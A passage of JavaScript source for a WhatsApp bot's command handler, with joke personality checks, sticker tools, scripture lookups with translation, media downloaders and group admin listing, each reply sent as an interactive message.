          ...await prepareWAMessageMedia({video:bogif, gifPlayback:true }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
    break
case 'checkme':{
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await AlyaBotInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppalya = await getBuffer(ppuser)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: profile
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: ppalya, mentions: [bet]}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [bet], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
case 'handsomecheck':{
				if (!text) return replygcalya(`Tag Someone, Example : ${prefix + command} @Alya`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: m.sender, 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
					break
case 'beautifulcheck':{
				if (!text) return replygcalya(`Tag Someone, Example : ${prefix + command} @Alya`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${tik}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
					break
					case 'charactercheck':{
					if (!text) return replygcalya(`Tag Someone, Example : ${prefix + command} @Alya`)
					const alya =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = alya[Math.floor(Math.random() * alya.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Character Check : ${q}\nAnswer : *${taky}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
				     break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/STAR-KING0/AlyaMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await AlyaBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return AlyaStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let alyaresources = await Telesticker(args[0])
		await replygcalya(`Sending ${alyaresources.length} stickers...`)
		if (m.isGroup && alyaresources.length > 30) {
			await replygcalya('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < alyaresources.length; i++) {
				AlyaBotInc.sendMessage(m.sender, { sticker: { url: alyaresources[i].url }})
			}
		} else {
			for (let i = 0; i < alyaresources.length; i++) {
				AlyaBotInc.sendMessage(m.chat, { sticker: { url: alyaresources[i].url }})
			}
		}
	} else replygcalya(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'setcmd': {
                if (!m.quoted) return replygcalya('Reply Message!')
                if (!m.quoted.fileSha256) return replygcalya('SHA256 Hash Missing')
                if (!text) return replygcalya(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcalya('You have no permission to change this sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcalya(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcalya(`No hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcalya('You have no permission to delete this sticker command')             
                delete global.db.data.sticker[hash]
                replygcalya(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                AlyaBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!m.quoted) return replygcalya('Reply Message!')
                if (!m.quoted.fileSha256) return replygcalya('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return replygcalya('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                replygcalya('Done!')
            }
            break
            case 'ss': case 'ssweb': {
if (!q) return replygcalya(`Example ${prefix+command} link`)
await AlyaStickWait()
let krt = await scp2.ssweb(q)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: krt.result}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🚀\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: pickupLine
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🙏\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    replygcalya(`Error: ${error.message}`)
  }
  }
  break
  case 'translate':{
  	if (!q) return replygcalya(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: result.text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
    } catch (e) {
        return replygcalya(err)
    } 
    }
    break
    case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    replygcalya(quranSurah)

    if (json.data.recitation.full) {
      AlyaBotInc.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    replygcalya(`Error: ${error.message}`)
  }
  }
  break
  case 'mediafire': {
  	if (!args[0]) return replygcalya(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return replygcalya(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    AlyaBotInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return AlyaStickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Menu 🚀\",\"id\":\"${prefix}menu"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [...groupAdmins.map(v => v.id), owner],
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
   
}
break
case 'addlist':
if (!AlyaTheQueen) return AlyaStickOwner()
if (!m.isGroup) return AlyaStickGroup()
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return replygcalya(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return replygcalya(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
replygcalya(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
replygcalya(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!AlyaBotInc) return AlyaStickOwner()
if (!m.isGroup) return AlyaStickGroup()
if (db_respon_list.length === 0) return replygcalya(`There is no message list in the database yet`)
if (!q) return replygcalya(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(from, q, db_respon_list)) return replygcalya(`Item list by Name *${q}* not in the database!`)
delResponList(from, q, db_respon_list)
replygcalya(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
replygcalya(teks)
}
break
case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replygcalya(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return replygcalya(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return replygcalya(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
